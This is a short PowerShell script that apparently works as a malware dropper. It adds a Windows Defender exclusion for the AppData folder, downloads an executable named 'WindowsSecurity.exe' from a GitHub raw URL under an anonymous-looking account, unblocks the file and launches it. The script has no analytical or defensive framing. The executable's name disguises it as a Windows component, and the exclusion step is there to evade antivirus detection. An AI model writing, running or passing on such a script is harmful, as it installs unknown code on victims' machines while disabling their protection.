# Set paths
$dir = $env:AppData
$file = "$dir\WindowsSecurity.exe"
$url = "https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/WindowsSecurity.exe"

# 1. Force the exclusion first
Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

# 2. Wait 2 seconds for Windows to apply the exclusion
Start-Sleep -s 2

# 3. Download the EXE
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $file)

# 4. Unblock and Launch
Unblock-File $file
Start-Process $file